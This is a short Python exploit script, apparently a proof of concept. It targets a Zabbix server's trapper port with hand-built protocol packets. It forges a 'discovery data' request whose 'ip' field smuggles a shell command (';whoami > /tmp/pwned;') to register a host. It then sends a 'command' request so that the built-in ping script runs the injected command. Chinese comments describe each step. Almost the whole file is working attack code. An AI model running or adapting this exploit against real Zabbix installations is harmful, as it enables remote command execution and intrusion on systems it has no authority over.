import socket
import struct
import json

ZABBIX_HOST = "192.168.1.12"
ZABBIX_PORT = 10051


def send_to_zabbix(data):

    client = socket.socket()
    client.connect((ZABBIX_HOST, ZABBIX_PORT))
    packet = "ZBXD\x01" + struct.pack('<Q', len(data)) + data
    client.sendall(packet)

    head = client.recv(1024)
    if "ZBXD" not in head:
        client.close()
        return head
    pkt_len = struct.unpack('<Q', client.recv(8))
    data = client.recv(pkt_len[0])
    client.close()
    return data


data = """{"request":"command","scriptid":1,"hostid":10107}"""

discovery = """{
    "request": "discovery data",
    "host": "test",
    "clock":1485353070,
    "data": [
        {
            "clock":1485353070,
            "drule":2,
            "dcheck":2,
            "type":0,
            "ip":";whoami > /tmp/pwned;",        
            "dns":"abc.com.cc",
            "port":10050,
            "key":"zzztest",
            "status":0,
            "value":"fuck"
        }
    ]
    }
"""

# 利用自动发现功能添加Host
# 可以‘select * from interface;’ 查看是否自动添加成功
print send_to_zabbix(discovery)

# 利用命令注入进行攻击
# scriptid == 1 == /bin/ping -c {HOST.CONN} 2>&1
print send_to_zabbix(data)
